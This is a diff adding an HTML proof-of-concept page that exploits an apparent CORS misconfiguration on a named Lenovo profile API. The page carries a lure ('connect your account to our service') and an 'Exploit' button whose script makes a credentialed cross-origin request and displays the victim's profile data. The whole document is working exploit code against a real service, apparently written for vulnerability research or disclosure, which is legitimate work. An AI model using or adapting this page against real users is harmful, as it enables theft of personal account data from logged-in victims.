@@ -1,0 +1,29 @@
+<html>
+  <body>
+    <div id="demo">
+      <h1>CORS PoC for Lenovo Profile Access</h1>
+      <h2>Please click the button below to attempt to connect your account to our service!</h2>
+      <button type="button" onclick="cors()">Exploit</button>
+    </div>
+
+    <script>
+      function cors() {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+            // Display the response (profile data) in the demo div
+            document.getElementById("demo").innerHTML = '<h2>Profile Data:</h2><pre>' + this.responseText + '</pre>';
+          } else if (this.readyState == 4 && this.status == 401) {
+            // Handle unauthorized error
+            document.getElementById("demo").innerHTML = "<h2>Unauthorized: You may need to be logged in to access this data.</h2>";
+          }
+        };
+
+        // Send GET request to Lenovo's profile API with credentials included (cookies)
+        xhr.open("GET", "https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile", true);
+        xhr.withCredentials = true;  // Include cookies in the request for session-based access
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
